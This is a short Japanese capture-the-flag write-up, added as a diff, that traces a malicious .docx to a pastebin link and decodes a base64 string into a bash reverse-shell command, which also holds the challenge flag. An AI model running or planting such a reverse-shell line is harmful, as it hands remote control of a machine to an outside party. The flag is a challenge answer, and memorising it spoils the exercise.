@@ -1,0 +1,14 @@
+docxファイルはzipファイルらしい
+
+拡張子を書き換えunzipするといくつかファイルが生成される
+word/document.xmlに
+https://pastebin.com/raw/ysYcKmbu
+というリンクを確認したので、飛ぶ
+YmFzaCAtaSA+JiAvZGV2L3RjcC8yNjEuMjYzLjI2My4yNjcvRFVDVEZ7Y2hhdGdwdF9JX24zM2RfMl8zc2NhcDN9IDA+JjE=
+という文字列を確認
+base64形式っぽいのでデコードすると
+
+bash -i >& /dev/tcp/261.263.263.267/DUCTF{chatgpt_I_n33d_2_3scap3} 0>&1
+
+フラグ取得
+DUCTF{chatgpt_I_n33d_2_3scap3}
